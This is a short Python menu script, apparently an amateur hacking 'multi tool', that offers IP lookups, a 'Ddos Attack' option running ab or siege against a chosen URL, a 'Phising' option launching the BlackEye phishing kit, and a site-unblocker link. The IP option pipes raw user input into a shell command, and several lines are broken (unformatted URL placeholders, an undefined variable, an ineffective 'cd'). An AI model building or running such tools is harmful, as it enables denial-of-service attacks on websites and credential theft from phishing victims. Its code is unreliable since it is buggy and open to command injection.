import time
import os
import subprocess
import webbrowser
import random 

banner = """
                ▄▄▌ ▐ ▄▌ ▄ .▄▪  ▄▄▄▄▄▄▄▄ .▄▄▌ ▐ ▄▌      ▄▄▌  ·▄▄▄
                ██· █▌▐███▪▐███ •██  ▀▄.▀·██· █▌▐█▪     ██•  ▐▄▄·
                ██▪▐█▐▐▌██▀▐█▐█· ▐█.▪▐▀▀▪▄██▪▐█▐▐▌ ▄█▀▄ ██▪  ██▪ 
                ▐█▌██▐█▌██▌▐▀▐█▌ ▐█▌·▐█▄▄▌▐█▌██▐█▌▐█▌.▐▌▐█▌▐▌██▌.
                 ▀▀▀▀ ▀▪▀▀▀ ·▀▀▀ ▀▀▀  ▀▀▀  ▀▀▀▀ ▀▪ ▀█▄▀▪.▀▀▀ ▀▀▀ 
"""
WHITE = "\033[97m"
print(f"${WHITE}{banner}")
print("[1] Help (?)")
print("[2] IP information")
print("[3] Ddos Attack")
print("[4] Phising")
print("[5] Search Engine")
x = input("Option: ")
if x == "1":
    print("This is one of many multi tools made by TerraBitten which has functionalities like Ddos'ing Websites / Internet Frameworks, keep in mind this is the second multi tool which will have more functionalities and better user interface for more help go to and read the .README ")

elif x == "2":
    user = input("IP address: ")
    command = f"curl ipinfo.io/{user}"
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
   
    if result.returncode == 0:
        print(result.stdout) 
    else:
        print(f"Error: {result.stderr}") 

elif x == "3":
    URL = input("URL to Ddos: ")
    y = input("Choose which DDoS software you desire to use apache2/siege (1 or 2): ")
    if y == "1":
        command = "ab -n 100 -c 10 {URL}"
    elif y == "2":
        command = "siege -c10 -r10 {URL}"
    else:
        print("Invalid option selected.")
        exit(1) 

    result = subprocess.run(command, shell=True, text=True, capture_output=True)

    if result.returncode == 0:
        print(result.stdout) 
    else:
        print(f"Error: {result.stderr}")  
    
elif x == "4":
    command1 = f"cd BlackEye"
    command2 = f"./blackeye.sh"
    result = subprocess.run(command1, shell=True, text=True, capture_output=True)
    result = subprocess.run(command2, shell=True, text=True, capture_output=True)

elif x == "5":
    engine = "https://nebula-blocker.vercel.app/"
    webbrowser.open(unblocker)
    time.sleep(0.5)
    print("Opening. . .")
    time.sleep(0.3)
    print("Process launched in browser")
